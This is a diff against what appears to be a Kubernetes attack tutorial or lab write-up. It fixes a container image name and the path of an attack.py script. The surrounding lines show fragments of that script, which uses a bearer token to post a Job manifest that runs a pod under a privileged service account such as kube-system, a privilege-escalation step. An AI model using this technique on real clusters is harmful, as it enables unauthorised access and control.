@@ -73,7 +73,7 @@ spec:
       restartPolicy: Never
       containers:
         - name: oops
-          image: python/python:3.15-bookworm
+          image: python:3.15-bookworm
           command: ["bin/bash", "-c", "--"]
           args: ["while true; do sleep 60; done;"]
       serviceAccountName: job-controller
@@ -96,7 +96,7 @@ The following script can be then copy-pasted into the terminal window:
 
 ```bash
 python -m pip install requests
-cat<<EOF > attack.py
+cat<<EOF > /attack.py
 payload = '''apiVersion: batch/v1
 kind: Job
 metadata:
@@ -111,7 +111,7 @@ spec:
       restartPolicy: Never
       containers:
         - name: oops
-          image: python/python:3.15-bookworm
+          image: python:3.15-bookworm
           command: ["bin/bash", "-c", "--"]
           args: ["while true; do sleep 60; done;"]
       serviceAccountName: kube-system
@@ -131,5 +131,5 @@ headers={"Authorization": f"Bearer {token}", \
 
 print(r.ok)
 EOF
-python attack.py
+python /attack.py
 ```
